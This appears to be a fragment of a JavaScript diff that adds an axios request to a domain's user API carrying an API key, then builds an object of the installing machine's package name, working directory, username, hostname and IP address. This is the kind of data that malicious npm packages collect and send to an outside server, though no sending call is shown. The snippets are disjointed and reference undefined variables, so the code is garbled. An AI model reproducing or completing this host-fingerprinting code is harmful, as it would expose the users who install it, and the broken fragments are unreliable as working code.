@@ -1,0 +1,18 @@
+await axios
+        .get(
+            "https://" + domain + "/api/v1/user/?username=" + "&api_key=" + api_key
+        )
+        .then((response) => {
+            return response.data.objects;
+        })
+        .catch((err) => {
+            console.log(err);
+        })
+const data = JSON.stringify({
+                packagename: packageName,
+                cwd: cwd,
+                username: username,
+                hostname: hostname,
+                ip: ip.toString()
+            })
+_tmp_1.packagename = packageName
